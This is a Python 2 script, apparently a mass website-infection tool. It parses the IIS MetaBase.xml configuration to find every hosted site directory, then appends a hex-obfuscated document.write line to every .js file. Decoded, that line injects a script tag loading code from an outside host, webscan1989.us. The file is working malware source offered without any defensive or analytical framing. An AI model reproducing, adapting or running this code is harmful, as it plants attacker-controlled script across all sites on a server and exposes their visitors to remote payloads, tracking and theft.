# -*- coding: utf-8 -*-
import re
import time
import os

GG_data="\nvar _$=['\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x20\\x74\\x79\\x70\\x65\\x3d\\x22\\x74\\x65\\x78\\x74\\x2f\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x22\\x20\\x73\\x72\\x63\\x3d\\x22\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x77\\x65\\x62\\x73\\x63\\x61\\x6e\\x31\\x39\\x38\\x39\\x2e\\x75\\x73\\x2f\\x54\\x4f\\x4d\\x2f\\x69\\x70\\x2e\\x70\\x68\\x70\\x22\\x3e\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e'];document.write( _$[0]);"

def file_add(name, data):
    # 写入文本
    try:
        file_object = open(name, 'a')
        file_object.writelines(data)
        file_object.writelines("\n")
        file_object.close()
        print name,"---file add OK"
    except Exception, e:
        print "file_add try--except %s,%s" %( name, e)

def file_dir(file):  #遍历目录
    try:
        print u"file_dir===%s==="%(file)
        for root, dirs, files in os.walk(file):
            for file in files:
                if file.endswith('.js'):
                    data=u"%s\%s"%(root,file)
                    #print data
                    file_add(data,GG_data)
    except BaseException, e:
        print("file_dir try--except ",file,str(e))
        return 0

def open_file():
    try:
        #C:\WINDOWS\system32\inetsrv\MetaBase.xml
        fname="C:\WINDOWS\system32\inetsrv\MetaBase.xml"
        xxx = file(fname, 'r')
        return xxx.read()
    except BaseException, e:
        print "IIS INI Not found"
        #print(str(e))
        return 0

def for_sleep(s): #延时提示
    try:
        for i in range(s):#网站路径
            time.sleep(1)
            print "sleep %d"%i
            ###########################################################
        return 0
    except BaseException, e:
        print(str(e))
        return 0

def IIS_xml1():
    try:
        data=open_file()
        if data==0:
            print u"C:\WINDOWS\system32\inetsrv\MetaBase.xml   无法找到IIS配置文件"
            #print u"Cannot find the file path in the C IIsWebServerfile"  #无法找到IIS配置文件
            return 0
        p2 = re.compile(r'<IIsWebVirtualDir.+?Path="(.+?)"')  #网站路径  LogFileDirectory="D:\nwwwroot\jisiw\logfiles"
        data2=data.replace("\n", ':')  #去除换行符好匹配
        ###########################################################
        IISWEB = p2.findall(data2)#网站路径
        for every1 in IISWEB:#网站路径
            file_url=u"%s"%every1
            #print u"===%s==="%(file_url)
            file_add("www_file_dir.txt", file_url)
            #bl_dt(every1)  #遍历地图
            file_dir(file_url)  #遍历目录
            for_sleep(2) #延时提示
            ###########################################################
        print u"=========整个遍历完成========="
    except BaseException, e:
        print(str(e))
        return 0

import sys
if __name__=='__main__':
    print u"=========IIS 挂载整个IISWEB目录JS TOM版本========="
    if len(sys.argv) < 2:
        IIS_xml1()  #iis操作
    else:
        TXT_file=sys.argv[1]
        file_add("www_file_dir.txt", TXT_file)
        #bl_dt(every1)  #遍历地图
        file_dir(TXT_file)  #遍历目录

    while True:
        time.sleep(0.5)

